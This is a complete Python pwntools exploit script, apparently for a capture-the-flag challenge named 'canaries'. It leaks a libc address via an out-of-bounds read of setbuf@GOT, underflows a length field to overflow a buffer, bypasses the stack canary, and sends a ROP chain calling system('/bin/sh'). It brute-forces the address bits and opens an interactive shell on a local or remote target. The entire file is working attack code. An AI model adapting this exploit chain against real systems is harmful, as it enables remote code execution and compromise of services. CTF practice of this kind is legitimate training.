#!/usr/bin/env python3
from pwn import *
import argparse
import re
import random

BINARY = "./main"
LIBC_PATH = "/usr/lib/x86_64-linux-gnu/libc.so.6"

# Option-2 OOB read index used to leak setbuf@GOT low32 from "weight"
# (g_canary_stats + 28*0x18 + 8 == setbuf@GOT)
LEAK_INDEX = 28

# Offset from buf[0] to saved RIP in main()
OFFSET_RIP = 0x38

# Pair-0 canary bypass values (table[0x200] stays zero)
BYPASS_CANARY_VALUE = 0
BYPASS_CANARY_INDEX = 0x200


def recv_menu(io):
    io.recvuntil(b"2) print canary stats\n")


def choose_rename(io):
    io.sendline(b"0")
    io.recvuntil(b"what will his name be?\n")


def set_size_to_minus_one(io):
    # 1) len=16, send one byte -> read()=1 -> len=0
    choose_rename(io)
    io.send(b"\n")

    # 2) len=0 -> read(...,0)=0 -> len=-1
    choose_rename(io)


def leak_setbuf_low32(io) -> int:
    recv_menu(io)
    io.sendline(b"2")
    io.recvuntil(b"select canary index (0-3):\n")
    io.sendline(str(LEAK_INDEX).encode())

    data = io.recvuntil(b"2) print canary stats\n", drop=False)
    m = re.search(rb"weight: (\d+)", data)
    if not m:
        raise ValueError("failed to parse weight leak")
    return int(m.group(1))


def build_payload(libc_base: int, libc: ELF) -> bytes:
    ret = libc_base + 0x2882F
    pop_rdi = libc_base + 0x10F78B
    system = libc_base + libc.sym["system"]
    bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))

    payload = b"A" * 0x10
    payload += p64(BYPASS_CANARY_VALUE)
    payload += p64(BYPASS_CANARY_INDEX)
    payload += b"B" * 0x10
    payload += p64(0x4141414141414141)  # saved rbp (unused by our chain)

    assert len(payload) == OFFSET_RIP

    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(system)

    # main() writes a trailing NUL at [buf + bytes_read - 1]
    payload += b"Z"
    return payload


def try_once(args, hi32_guess: int, marker: bytes):
    libc = ELF(LIBC_PATH, checksec=False)

    if args.remote:
        io = remote(args.host, args.port)
    elif args.noaslr:
        io = process(["setarch", "x86_64", "-R", BINARY], stdin=PIPE, stdout=PIPE, stderr=PIPE)
    else:
        io = process(BINARY, stdin=PIPE, stdout=PIPE, stderr=PIPE)

    try:
        leak = leak_setbuf_low32(io)
        libc_low32 = (leak - (libc.sym["setbuf"] & 0xFFFFFFFF)) & 0xFFFFFFFF
        libc_base = (hi32_guess << 32) | libc_low32

        payload = build_payload(libc_base, libc)

        set_size_to_minus_one(io)
        choose_rename(io)
        io.send(payload)

        recv_menu(io)

        # Trigger main() return and queue a shell command in the same send
        io.send(b"x\n")
        io.send(b"echo " + marker + b"; id\n")

        out = io.recvrepeat(args.probe_timeout)
        if marker in out:
            return io, leak, libc_base, out

        io.close()
        return None, leak, libc_base, out

    except Exception:
        try:
            io.close()
        except Exception:
            pass
        return None, None, None, b""


def brute_hi_candidates(start: int, end: int):
    vals = list(range(start, end + 1))
    random.shuffle(vals)
    return vals


def main():
    parser = argparse.ArgumentParser(description="canaries exploit (docker-friendly brute mode)")
    parser.add_argument("--remote", action="store_true")
    parser.add_argument("--host", default="canaries.ctf.ingeniums.club")
    parser.add_argument("--port", type=int, default=6702)
    parser.add_argument("--noaslr", action="store_true")

    parser.add_argument("--single-hi32", type=lambda x: int(x, 0), help="single hi32 guess (debug)")
    parser.add_argument("--hi32-start", type=lambda x: int(x, 0), default=0x6F00)
    parser.add_argument("--hi32-end", type=lambda x: int(x, 0), default=0x8000)
    parser.add_argument("--max-attempts", type=int, default=0, help="0 means infinite")
    parser.add_argument("--probe-timeout", type=float, default=0.45)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    context.binary = ELF(BINARY, checksec=False)
    context.log_level = "debug" if args.debug else "info"

    marker = b"PWN_MARKER_7a91d2"

    if args.single_hi32 is not None:
        candidates = [args.single_hi32]
    else:
        candidates = brute_hi_candidates(args.hi32_start, args.hi32_end)

    attempt = 0
    while True:
        if args.max_attempts and attempt >= args.max_attempts:
            log.failure("Reached max attempts without shell")
            return

        hi = candidates[attempt % len(candidates)]
        attempt += 1

        io, leak, libc_base, out = try_once(args, hi, marker)
        if leak is not None:
            log.info(
                f"attempt={attempt} hi32=0x{hi:04x} leak=0x{leak:08x} base=0x{libc_base:016x}"
            )

        if io is not None:
            log.success(f"Shell popped on attempt {attempt} with hi32=0x{hi:04x}")
            if out:
                try:
                    print(out.decode("latin-1", "replace"), end="")
                except Exception:
                    pass
            io.interactive()
            return


if __name__ == "__main__":
    main()
